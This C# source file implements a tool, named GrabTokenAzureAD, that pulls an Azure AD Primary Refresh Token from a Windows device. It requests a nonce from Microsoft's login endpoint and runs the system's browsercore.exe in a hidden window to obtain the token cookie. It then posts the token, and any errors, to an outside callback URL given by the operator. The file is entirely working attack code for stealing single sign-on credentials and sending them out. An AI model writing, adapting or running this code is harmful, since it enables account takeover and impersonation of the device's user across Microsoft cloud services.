using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace GrabTokenAzureAD
{
    public class PrtExtractor
    {
        private readonly string _callbackUrl;

        public event EventHandler<string> OnStatus;

        public PrtExtractor(string callbackUrl)
        {
            _callbackUrl = callbackUrl;
        }

        public PrtResult ExtractPrt()
        {
            var result = new PrtResult();

            try
            {
                RaiseStatus("Requesting nonce from Azure AD...");
                string nonce = GetNonce();
                if (string.IsNullOrEmpty(nonce))
                {
                    result.Error = "Failed to obtain nonce";
                    SendError(result.Error);
                    return result;
                }
                RaiseStatus($"Nonce obtained: {nonce.Substring(0, Math.Min(20, nonce.Length))}...");

                RaiseStatus("Locating browsercore.exe...");
                string browserCorePath = FindBrowserCore();
                if (string.IsNullOrEmpty(browserCorePath))
                {
                    result.Error = "browsercore.exe not found - device may not be Azure AD joined";
                    SendError(result.Error);
                    return result;
                }
                RaiseStatus($"Found: {browserCorePath}");

                RaiseStatus("Extracting PRT via browsercore...");
                string prtToken = CallBrowserCore(browserCorePath, nonce);
                if (string.IsNullOrEmpty(prtToken))
                {
                    result.Error = "No PRT token returned from browsercore";
                    SendError(result.Error);
                    return result;
                }

                result.PrtToken = prtToken;
                result.Success = true;
                RaiseStatus("PRT successfully extracted!");

                SendPrt(prtToken);
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                RaiseStatus($"Error: {ex.Message}");
                SendError(ex.Message);
            }

            return result;
        }

        private string GetNonce()
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create("https://login.microsoftonline.com/Common/oauth2/token");
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Timeout = 10000;

                byte[] data = Encoding.UTF8.GetBytes("grant_type=srv_challenge");
                request.ContentLength = data.Length;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                using (var response = (HttpWebResponse)request.GetResponse())
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    string json = reader.ReadToEnd();
                    var dict = SimpleJsonParser.Parse(json);
                    dict.TryGetValue("Nonce", out string nonce);
                    return nonce;
                }
            }
            catch
            {
                return null;
            }
        }

        private string FindBrowserCore()
        {
            string[] locations = new[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    "Windows Security", "BrowserCore", "browsercore.exe"),
                Path.Combine(Environment.GetEnvironmentVariable("windir") ?? @"C:\Windows",
                    "BrowserCore", "browsercore.exe")
            };

            foreach (var path in locations)
            {
                if (File.Exists(path))
                    return path;
            }

            return null;
        }

        private string CallBrowserCore(string browserCorePath, string nonce)
        {
            string jsonRequest = "{" +
                "\"method\":\"GetCookies\"," +
                "\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce + "\"," +
                "\"sender\":\"https://login.microsoftonline.com\"" +
                "}";

            var psi = new ProcessStartInfo
            {
                FileName = browserCorePath,
                UseShellExecute = false,
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (var process = new Process { StartInfo = psi })
            {
                process.Start();

                byte[] jsonBytes = Encoding.UTF8.GetBytes(jsonRequest);
                byte[] lengthPrefix = BitConverter.GetBytes(jsonBytes.Length);

                process.StandardInput.BaseStream.Write(lengthPrefix, 0, 4);
                process.StandardInput.BaseStream.Write(jsonBytes, 0, jsonBytes.Length);
                process.StandardInput.Close();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                int jsonStart = output.IndexOf('{');
                if (jsonStart < 0)
                    return null;

                string jsonResponse = output.Substring(jsonStart);
                var parsed = SimpleJsonParser.Parse(jsonResponse);

                if (parsed.TryGetValue("status", out string status) && status == "Fail")
                {
                    parsed.TryGetValue("description", out string desc);
                    throw new Exception($"BrowserCore failed: {desc}");
                }

                if (parsed.TryGetValue("response", out string responseStr))
                {
                    int dataStart = responseStr.IndexOf("\"data\":", StringComparison.Ordinal);
                    if (dataStart >= 0)
                    {
                        int valueStart = responseStr.IndexOf('"', dataStart + 7);
                        if (valueStart >= 0)
                        {
                            int valueEnd = responseStr.IndexOf('"', valueStart + 1);
                            if (valueEnd > valueStart)
                            {
                                return responseStr.Substring(valueStart + 1, valueEnd - valueStart - 1);
                            }
                        }
                    }
                }

                int dataIdx = jsonResponse.IndexOf("\"data\":", StringComparison.Ordinal);
                if (dataIdx >= 0)
                {
                    int valueStart = jsonResponse.IndexOf('"', dataIdx + 7);
                    if (valueStart >= 0)
                    {
                        int valueEnd = FindEndOfString(jsonResponse, valueStart + 1);
                        if (valueEnd > valueStart)
                        {
                            return UnescapeJson(jsonResponse.Substring(valueStart + 1, valueEnd - valueStart - 1));
                        }
                    }
                }

                return null;
            }
        }

        private int FindEndOfString(string s, int start)
        {
            for (int i = start; i < s.Length; i++)
            {
                if (s[i] == '\\' && i + 1 < s.Length)
                {
                    i++;
                    continue;
                }
                if (s[i] == '"')
                    return i;
            }
            return -1;
        }

        private string UnescapeJson(string s)
        {
            if (string.IsNullOrEmpty(s) || !s.Contains("\\")) return s;

            var sb = new StringBuilder(s.Length);
            for (int i = 0; i < s.Length; i++)
            {
                if (s[i] == '\\' && i + 1 < s.Length)
                {
                    char next = s[i + 1];
                    switch (next)
                    {
                        case 'n': sb.Append('\n'); i++; break;
                        case 'r': sb.Append('\r'); i++; break;
                        case 't': sb.Append('\t'); i++; break;
                        case '"': sb.Append('"'); i++; break;
                        case '\\': sb.Append('\\'); i++; break;
                        default: sb.Append(s[i]); break;
                    }
                }
                else
                {
                    sb.Append(s[i]);
                }
            }
            return sb.ToString();
        }

        private void SendPrt(string prtToken)
        {
            if (string.IsNullOrEmpty(_callbackUrl)) return;

            try
            {
                string payload = "{\"label\":\"prt\",\"token\":\"" + EscapeJson(prtToken) + "\"}";
                byte[] data = Encoding.UTF8.GetBytes(payload);

                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.UploadData(_callbackUrl, "POST", data);
                }
                RaiseStatus("PRT sent to callback");
            }
            catch (Exception ex)
            {
                RaiseStatus($"Callback failed: {ex.Message}");
            }
        }

        private void SendError(string error)
        {
            if (string.IsNullOrEmpty(_callbackUrl)) return;

            try
            {
                string payload = "{\"error\":\"prt: " + EscapeJson(error) + "\"}";
                byte[] data = Encoding.UTF8.GetBytes(payload);

                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.UploadData(_callbackUrl, "POST", data);
                }
            }
            catch { }
        }

        private static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return s;
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }

        private void RaiseStatus(string message)
        {
            OnStatus?.Invoke(this, message);
        }
    }

    public class PrtResult
    {
        public bool Success { get; set; }
        public string PrtToken { get; set; }
        public string Error { get; set; }
    }
}
